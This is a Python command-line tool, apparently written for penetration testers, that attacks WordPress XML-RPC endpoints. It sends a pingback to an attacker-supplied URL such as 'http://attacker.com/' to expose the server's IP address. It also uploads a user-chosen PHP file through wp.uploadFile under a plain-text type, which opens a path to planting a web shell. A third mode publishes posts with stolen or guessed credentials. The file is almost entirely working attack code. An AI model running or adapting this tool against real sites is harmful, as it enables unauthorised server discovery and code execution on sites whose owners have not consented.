#!/usr/bin/python3
# Created by D3s0late - 03/12/2019 - 16:25

import datetime
import requests
import xmlrpc.client
import argparse
from wordpress_xmlrpc import Client, WordPressPost
from wordpress_xmlrpc.methods.posts import NewPost
from xmlrpc.client import Error

choices = (['pingback','upload','post'])
parser = argparse.ArgumentParser(description='Wordpress XMLRPC explorer for pentesters.')
parser.add_argument('-i','--id', default=1, type=int, help='The blog ID of the user.')
parser.add_argument('-u','--username', help='Username from wordpress.')
parser.add_argument('-v','--valid', help='A valid post to pingback (required for pingback mode). ex: http://example.com/blog/example-post/1')
parser.add_argument('-p','--password', help='Password from wordpress.')
parser.add_argument('-f','--file', help='File to upload, must be in current directory. ex: teste.php')
parser.add_argument('--url', required=True, help='Target URL, full path. ex: http://127.0.0.1/xmlrpc.php')
parser.add_argument('--mode', required=True, choices=choices, help='Choose between 3 available modes: pingback (attacker URL required), upload (try to upload a php to wordpress(username and password required)) and post (try to post an example blogpost(username and password required))')
parser.add_argument('-a','--attacker', help='URL from the attacker web server. ex: http://attacker.com/')
args = parser.parse_args()

#autenticacao

url = args.url
attacker = args.attacker
username = args.username
password = args.password
blogid = args.id
filename = args.file
data = datetime.datetime.now()
#postar e ativar novo post:

def PostWp():
    poster = Client(url, username, password)
    post = WordPressPost()
    post.title = 'Teste XMLRPwn'
    post.content = 'Teste de XML-RPC feito com xmlrpwn.'
    post.post_status = 'publish'
    post.terms_names = {
    'post_tag': ['teste', 'xmlrpwn'],
    'category': ['Introducao', 'Teste']
    }
    poster.call(NewPost(post))

#fazer upload do arquivo php

def UploadFile(path):
    server = xmlrpc.client.ServerProxy(url)
    with open(path, "rb") as f:
        data = f.read()
        img = xmlrpc.client.Binary(data)
    data = {'name': path, 'type': 'text/plain', 'bits': data}
    server.wp.uploadFile(blogid, username, password, data)
    f.close()

def PingBack():
    valid = args.valid
    pgbheaders = {"accept": "application/json", "cache-control": "no-cache", "Content-Type": "application/json", "Connection": "close", "Accept-Encoding": "gzip, deflate", "User-Agent": "okhttp/3.12.1"}
    pgbdata = "<methodCall>\r\n<methodName>pingback.ping</methodName>\r\n<params><param>\r\n<value><string>{0}teste</string></value>\r\n</param><param><value><string>{1}</string>\r\n</value></param></params>\r\n</methodCall>".format(attacker,valid)
    requests.post(url, headers=pgbheaders, data=pgbdata)

def main():
    if args.mode == 'pingback' and args.valid is not None:
        print("[!] Sending pingback request..")
        print("[!] Wait for the request with the IP address.")
        PingBack() #Send pingback!
        print("[!] Request send!")
    elif args.mode == 'pingback' and args.valid is None:
        print("[x] ERROR!")
        print("[x] Valid argument is needed to send pingback request (--valid).")
    elif args.mode == 'post' and args.username and args.password is not None:
        print("[!] Trying to post to wordpress..")
        PostWp()
        print("[!] Posted!")
    elif args.mode == 'post' and args.username and args.password is None:
        print("[x] ERROR!")
        print("[x] Valid username and password is required for this mode.")
    elif args.mode == 'upload' and args.username and args.password and filename is not None:
        print("[!] Trying to upload php to web server..")
        UploadFile(filename)
        print("[!] File Uploaded to /wp-content/uploads/{0}/{1}/".format(data.year,data.strftime('%m')))
    elif args.mode == 'upload' and args.username and args.password and filename is None:
        print("[x] ERROR!") 
        print("[x] Valid username, password and file is required for this mode.")

if __name__ == '__main__':
    main()
